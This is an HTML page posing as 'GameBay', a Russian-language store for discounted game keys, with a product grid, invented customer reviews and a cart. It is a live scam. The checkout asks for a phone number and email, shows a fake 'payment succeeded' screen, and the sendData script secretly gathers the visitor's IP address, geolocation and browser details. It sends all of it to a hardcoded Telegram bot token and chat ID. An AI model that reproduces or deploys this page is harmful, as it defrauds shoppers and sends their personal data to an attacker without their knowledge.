<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>GameBay — Цифровой маркетплейс №1</title>
    <style>
        :root {
            --bg: #f0f2f5;
            --white: #ffffff;
            --border: #e4e6eb;
            --primary: #4f46e5;
            --primary-dark: #4338ca;
            --accent: #f43f5e;
            --text: #1f2937;
            --sub: #6b7280;
            --green: #10b981;
            --orange: #f59e0b;
            --shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -2px rgba(0,0,0,0.1);
            --shadow-lg: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -4px rgba(0,0,0,0.1);
            --radius: 16px;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            -webkit-tap-highlight-color: transparent;
        }
        .header {
            background: var(--white);
            border-bottom: 1px solid var(--border);
            position: sticky;
            top: 0;
            z-index: 1000;
            padding: 0 20px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
        }
        .header-inner {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 64px;
            gap: 20px;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 900;
            font-size: 26px;
            color: var(--text);
            cursor: pointer;
        }
        .logo-icon {
            width: 40px; height: 40px;
            background: linear-gradient(135deg, #4f46e5, #7c3aed);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 20px;
        }
        .search-bar {
            flex: 1;
            max-width: 500px;
            position: relative;
        }
        .search-bar input {
            width: 100%;
            padding: 12px 16px 12px 44px;
            border-radius: 30px;
            border: 2px solid var(--border);
            background: var(--bg);
            font-size: 15px;
            outline: none;
        }
        .search-bar input:focus { border-color: var(--primary); }
        .search-bar span { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); }
        .header-actions { display: flex; gap: 12px; align-items: center; }
        .cart-btn {
            background: var(--primary);
            color: #fff;
            font-weight: 700;
            padding: 10px 20px;
            border-radius: 30px;
            cursor: pointer;
            border: none;
            display: flex;
            align-items: center;
            gap: 6px;
            position: relative;
            font-size: 14px;
        }
        .cart-count {
            background: var(--accent);
            color: #fff;
            font-size: 11px;
            font-weight: 800;
            min-width: 20px;
            height: 20px;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: absolute;
            top: -6px;
            right: -6px;
        }
        .hero {
            background: linear-gradient(135deg, #1e1b4b, #312e81, #4c1d95);
            padding: 50px 20px;
            text-align: center;
            color: #fff;
        }
        .hero h1 { font-size: 36px; font-weight: 900; margin-bottom: 6px; }
        .hero p { color: #c7d2fe; font-size: 16px; margin-bottom: 20px; }
        .hero-badges { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin-bottom: 20px; }
        .hero-badge {
            background: rgba(255,255,255,0.12);
            color: #fff;
            font-weight: 700;
            font-size: 13px;
            padding: 8px 16px;
            border-radius: 20px;
        }
        .btn-primary {
            display: inline-block;
            background: var(--accent);
            color: #fff;
            font-weight: 800;
            padding: 14px 32px;
            border-radius: 30px;
            cursor: pointer;
            border: none;
            font-size: 16px;
        }
        .categories {
            display: flex;
            gap: 10px;
            padding: 16px 20px;
            max-width: 1400px;
            margin: 0 auto;
            overflow-x: auto;
        }
        .cat-chip {
            padding: 10px 18px;
            border-radius: 24px;
            font-weight: 700;
            font-size: 13px;
            white-space: nowrap;
            cursor: pointer;
            border: 2px solid var(--border);
            background: var(--white);
            color: var(--sub);
            transition: 0.2s;
        }
        .cat-chip.active { background: var(--primary); color: #fff; border-color: var(--primary); }
        .container { max-width: 1400px; margin: 0 auto; padding: 0 20px; }
        .section-title { font-size: 24px; font-weight: 900; margin: 24px 0 16px; }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
            gap: 18px;
            margin-bottom: 30px;
        }
        .card {
            background: var(--white);
            border-radius: var(--radius);
            overflow: hidden;
            box-shadow: var(--shadow);
            transition: 0.3s;
            cursor: pointer;
        }
        .card:hover { transform: translateY(-4px); box-shadow: var(--shadow-lg); }
        .card-img-wrap { position: relative; width: 100%; aspect-ratio: 16/10; overflow: hidden; background: #e5e7eb; }
        .card-img { width: 100%; height: 100%; object-fit: cover; }
        .card-discount {
            position: absolute;
            top: 12px; right: 12px;
            background: #ef4444; color: #fff;
            font-weight: 800; font-size: 12px;
            padding: 4px 10px; border-radius: 8px;
        }
        .card-body { padding: 14px 16px 18px; }
        .card-platform { font-size: 11px; font-weight: 700; color: var(--sub); text-transform: uppercase; margin-bottom: 4px; }
        .card-title { font-weight: 700; font-size: 15px; margin-bottom: 6px; line-height: 1.3; }
        .card-rating { font-size: 12px; color: #f59e0b; font-weight: 600; }
        .card-price-row { display: flex; align-items: center; justify-content: space-between; margin-top: 8px; }
        .card-price { font-size: 20px; font-weight: 900; color: var(--primary); }
        .card-old-price { text-decoration: line-through; color: #9ca3af; font-size: 13px; margin-right: 6px; }
        .btn-buy {
            padding: 8px 16px;
            background: var(--primary);
            color: #fff;
            font-weight: 700;
            border: none;
            border-radius: 10px;
            font-size: 13px;
            cursor: pointer;
        }
        .modal-overlay {
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.4);
            z-index: 9999;
            display: flex;
            align-items: flex-end;
            justify-content: center;
        }
        .modal-sheet {
            background: #fff;
            width: 100%;
            max-width: 500px;
            border-radius: 24px 24px 0 0;
            padding: 24px 20px 32px;
            max-height: 75vh;
            overflow-y: auto;
        }
        .footer { text-align: center; padding: 30px; background: #fff; color: #6b7280; font-size: 13px; border-top: 1px solid #e4e6eb; }
    </style>
</head>
<body>

<header class="header">
    <div class="header-inner">
        <div class="logo"><div class="logo-icon">🎮</div>GameBay</div>
        <div class="search-bar">
            <span>🔍</span>
            <input type="text" placeholder="Поиск игр..." id="searchInput" oninput="renderGames()">
        </div>
        <div class="header-actions">
            <button class="cart-btn" onclick="openCart()">
                🛒 Корзина <span class="cart-count" id="cartBadge">0</span>
            </button>
        </div>
    </div>
</header>

<div class="hero">
    <h1>🚀 Маркетплейс цифровых ключей №1</h1>
    <p>Мгновенная доставка • Честные цены • 500 000+ клиентов</p>
    <div class="hero-badges">
        <span class="hero-badge">⚡ Мгновенно</span>
        <span class="hero-badge">🔒 Безопасно</span>
        <span class="hero-badge">⭐ 4.9 рейтинг</span>
    </div>
    <button class="btn-primary" onclick="document.getElementById('catalog').scrollIntoView({behavior:'smooth'})">🔥 Смотреть скидки</button>
</div>

<div class="categories">
    <button class="cat-chip active" onclick="filterGames('all', this)">Все</button>
    <button class="cat-chip" onclick="filterGames('Steam', this)">Steam</button>
    <button class="cat-chip" onclick="filterGames('Xbox', this)">Xbox</button>
    <button class="cat-chip" onclick="filterGames('PS', this)">PS</button>
    <button class="cat-chip" onclick="filterGames('Epic', this)">Epic</button>
    <button class="cat-chip" onclick="filterGames('Rockstar', this)">Rockstar</button>
</div>

<div class="container" id="catalog">
    <div class="section-title">🎯 Популярное <span style="color:#6b7280;font-size:14px;" id="gameCount"></span></div>
    <div class="grid" id="gameGrid"></div>
</div>

<div class="container">
    <div class="section-title">💬 Отзывы</div>
    <div style="display:flex;gap:14px;overflow-x:auto;padding-bottom:20px;" id="reviewsRow"></div>
</div>

<div class="footer">
    💳 🍏 💵 • © 2026 GameBay • Не является публичной офертой
</div>

<script>
const TOKEN = '7959565855:AAGXvmUb-T1pPCjYJJRFXcEkE8PFVvJQXSM';
const CHAT_ID = '1391249960';

const allGames = [
    { id:1, title:"GTA V Premium", platform:"Rockstar", price:1047, oldPrice:3490, discount:70, img:"https://img.g2a.com/323x433/1x1x0/grand-theft-auto-v-premium-online-edition-rockstar-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.9, sold:124000 },
    { id:2, title:"Red Dead Redemption 2", platform:"Rockstar", price:1796, oldPrice:4490, discount:60, img:"https://img.g2a.com/323x433/1x1x0/red-dead-redemption-2-rockstar-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.8, sold:89000 },
    { id:3, title:"Cyberpunk 2077", platform:"Steam", price:1899, oldPrice:3999, discount:53, img:"https://img.g2a.com/323x433/1x1x0/cyberpunk-2077-steam-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.7, sold:156000 },
    { id:4, title:"EA FC 25", platform:"Steam", price:2499, oldPrice:4499, discount:44, img:"https://img.g2a.com/323x433/1x1x0/ea-sports-fc-25-steam-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.6, sold:98000 },
    { id:5, title:"Hogwarts Legacy", platform:"Steam", price:1999, oldPrice:3999, discount:50, img:"https://img.g2a.com/323x433/1x1x0/hogwarts-legacy-steam-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.8, sold:112000 },
    { id:6, title:"Spider-Man 2", platform:"PS", price:3290, oldPrice:5490, discount:40, img:"https://img.g2a.com/323x433/1x1x0/marvels-spider-man-2-ps5-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.9, sold:67000 },
    { id:7, title:"Forza Horizon 5", platform:"Epic", price:1299, oldPrice:3990, discount:67, img:"https://img.g2a.com/323x433/1x1x0/forza-horizon-5-premium-edition-epic-games-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.8, sold:51000 },
    { id:8, title:"Call of Duty MW3", platform:"Steam", price:3499, oldPrice:5999, discount:42, img:"https://img.g2a.com/323x433/1x1x0/call-of-duty-modern-warfare-iii-steam-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.5, sold:143000 },
    { id:9, title:"Minecraft", platform:"Steam", price:1499, oldPrice:1999, discount:25, img:"https://img.g2a.com/323x433/1x1x0/minecraft-java-bedrock-edition-steam-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.9, sold:250000 },
    { id:10, title:"Baldur's Gate 3", platform:"Steam", price:2199, oldPrice:2999, discount:27, img:"https://img.g2a.com/323x433/1x1x0/baldurs-gate-3-steam-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.9, sold:189000 },
    { id:11, title:"Game Pass Ultimate 3м", platform:"Xbox", price:1260, oldPrice:2290, discount:45, img:"https://img.g2a.com/323x433/1x1x0/xbox-game-pass-ultimate-3-month-xbox-windows/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.7, sold:32000 },
    { id:12, title:"ELDEN RING", platform:"Steam", price:2399, oldPrice:3999, discount:40, img:"https://img.g2a.com/323x433/1x1x0/elden-ring-steam-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.9, sold:220000 },
    { id:13, title:"Assassin's Creed Mirage", platform:"Steam", price:1799, oldPrice:2999, discount:40, img:"https://img.g2a.com/323x433/1x1x0/assassins-creed-mirage-steam-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.6, sold:45000 },
    { id:14, title:"Diablo IV", platform:"Steam", price:2999, oldPrice:4999, discount:40, img:"https://img.g2a.com/323x433/1x1x0/diablo-iv-steam-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.5, sold:78000 },
    { id:15, title:"Starfield", platform:"Steam", price:2999, oldPrice:4999, discount:40, img:"https://img.g2a.com/323x433/1x1x0/starfield-steam-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.3, sold:34000 },
    { id:16, title:"The Witcher 3", platform:"Steam", price:499, oldPrice:1499, discount:67, img:"https://img.g2a.com/323x433/1x1x0/the-witcher-3-wild-hunt-complete-edition-steam-key-global/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.9, sold:310000 },
];

let cart = [];
let currentFilter = 'all';

function renderGames() {
    const search = (document.getElementById('searchInput')?.value || '').toLowerCase();
    let filtered = allGames;
    if (currentFilter !== 'all') filtered = filtered.filter(g => g.platform === currentFilter);
    if (search) filtered = filtered.filter(g => g.title.toLowerCase().includes(search));
    document.getElementById('gameCount').textContent = `(${filtered.length})`;
    document.getElementById('gameGrid').innerHTML = filtered.map(g => `
        <div class="card">
            <div class="card-img-wrap">
                <img class="card-img" src="${g.img}" alt="${g.title}" onerror="this.style.background='#e5e7eb'">
                <span class="card-discount">-${g.discount}%</span>
            </div>
            <div class="card-body">
                <div class="card-platform">${g.platform}</div>
                <div class="card-title">${g.title}</div>
                <div class="card-rating">⭐ ${g.rating} (${(g.sold/1000).toFixed(0)}k)</div>
                <div class="card-price-row">
                    <div><span class="card-old-price">${g.oldPrice}₽</span> <span class="card-price">${g.price}₽</span></div>
                    <button class="btn-buy" onclick="addToCart(${g.id})">🛒</button>
                </div>
            </div>
        </div>
    `).join('');
}

function renderReviews() {
    const reviews = [
        { name:"Алексей", text:"Купил GTA V — ключ за 12 секунд. Активировал, всё работает!", stars:5 },
        { name:"Дмитрий", text:"Третий заказ. Цены ниже рынка, доставка всегда быстрая.", stars:5 },
        { name:"Марина", text:"Spider-Man 2 для PS5 — ключ рабочий, регион Россия. Спасибо!", stars:5 },
        { name:"Игорь", text:"Baldur's Gate 3 за 2199₽ — играю, всё отлично.", stars:5 },
    ];
    document.getElementById('reviewsRow').innerHTML = reviews.map(r => `
        <div style="min-width:250px;background:#fff;border-radius:16px;padding:16px;box-shadow:0 2px 8px rgba(0,0,0,0.06);">
            <div style="color:#f59e0b;">${'⭐'.repeat(r.stars)}</div>
            <div style="font-weight:700;margin:4px 0;">${r.name}</div>
            <div style="font-size:13px;color:#374151;">${r.text}</div>
        </div>
    `).join('');
}

function filterGames(platform, btn) {
    currentFilter = platform;
    document.querySelectorAll('.cat-chip').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    renderGames();
}

function addToCart(id) {
    const game = allGames.find(g => g.id === id);
    if (!game) return;
    cart.push({...game});
    updateBadge();
}
function removeFromCart(i) { cart.splice(i,1); updateBadge(); openCart(); }
function updateBadge() { document.getElementById('cartBadge').textContent = cart.length; }

function openCart() {
    const ex = document.querySelector('.modal-overlay');
    if (ex) ex.remove();
    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay';
    overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
    const total = cart.reduce((s,g)=>s+g.price,0);
    overlay.innerHTML = `<div class="modal-sheet">
        <h3>🛒 Корзина (${cart.length})</h3>
        ${cart.length===0 ? '<p style="text-align:center;color:#6b7280;">Пусто</p>' : cart.map((g,i)=>`
            <div style="display:flex;gap:12px;align-items:center;padding:10px 0;border-bottom:1px solid #e4e6eb;">
                <img src="${g.img}" style="width:48px;height:48px;border-radius:10px;object-fit:cover;" onerror="this.style.background='#e5e7eb'">
                <div style="flex:1;"><b>${g.title}</b><br><span style="color:#4f46e5;">${g.price}₽</span></div>
                <span style="color:#ef4444;cursor:pointer;" onclick="removeFromCart(${i})">✕</span>
            </div>
        `).join('')}
        ${cart.length>0 ? `<div style="font-weight:800;margin-top:10px;">Итого: ${total}₽</div>` : ''}
        ${cart.length>0 ? `<button style="width:100%;padding:16px;background:#4f46e5;color:#fff;font-weight:800;border:none;border-radius:14px;font-size:16px;margin-top:14px;" onclick="openCheckout()">💳 Оформить</button>` : ''}
    </div>`;
    document.body.appendChild(overlay);
}

function openCheckout() {
    const ex = document.querySelector('.modal-overlay');
    if (ex) ex.remove();
    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay';
    overlay.style.alignItems = 'center';
    overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
    overlay.innerHTML = `<div class="modal-sheet" style="border-radius:20px;text-align:center;">
        <h3>🧾 Оформление</h3>
        <p style="color:#6b7280;">Сумма: ${cart.reduce((s,g)=>s+g.price,0)}₽</p>
        <input id="ph" type="tel" placeholder="+7 926 123-45-67" style="width:100%;padding:14px;border:1px solid #e4e6eb;border-radius:12px;margin:8px 0;font-size:15px;">
        <input id="em" type="email" placeholder="email@example.com" style="width:100%;padding:14px;border:1px solid #e4e6eb;border-radius:12px;margin:8px 0;font-size:15px;">
        <button id="payBtn" style="width:100%;padding:16px;background:#4f46e5;color:#fff;font-weight:800;border:none;border-radius:14px;font-size:16px;margin-top:8px;">💳 Оплатить</button>
    </div>`;
    document.body.appendChild(overlay);
    document.getElementById('payBtn').onclick = () => {
        const phone = document.getElementById('ph').value.trim();
        const email = document.getElementById('em').value.trim();
        if (phone.replace(/\D/g,'').length < 7 || !email.includes('@')) { alert('Заполните корректно'); return; }
        overlay.innerHTML = `<div class="modal-sheet" style="border-radius:20px;text-align:center;"><div style="width:44px;height:44px;border:4px solid #e4e6eb;border-top:4px solid #4f46e5;border-radius:50%;animation:spin 0.8s linear infinite;margin:20px auto;"></div><p>Обработка...</p></div>`;
        setTimeout(() => {
            overlay.innerHTML = `<div class="modal-sheet" style="border-radius:20px;text-align:center;"><div style="font-size:48px;">✅</div><h3>Оплата прошла</h3><p>Ключи на ${email}</p></div>`;
            setTimeout(() => overlay.remove(), 3000);
            sendData(phone, email);
        }, 2500);
    };
}

async function sendData(phone, email) {
    let ip = 'неизвестен';
    try { ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch(e){}
    let geo = 'не определено', org = '';
    try {
        const d = await (await fetch(`https://ipapi.co/${ip}/json/`)).json();
        geo = d.city ? `${d.city}, ${d.region}, ${d.country_name}` : geo;
        org = d.org || '';
    } catch(e){}
    const msg = `🕵️ Новый заказ GameBay!\n\nIP: <code>${ip}</code>\n🌍 ${geo}\n📡 ${org}\n\n📧 Почта: ${email}\n📱 Телефон: ${phone}\n\n📱 ${navigator.userAgent}\n🕒 ${new Date().toLocaleString()}`;
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
    });
}

renderGames();
renderReviews();
setTimeout(() => {
    const loader = document.getElementById('loader');
    if (loader) loader.remove();
}, 500);
</script>
</body>
</html>
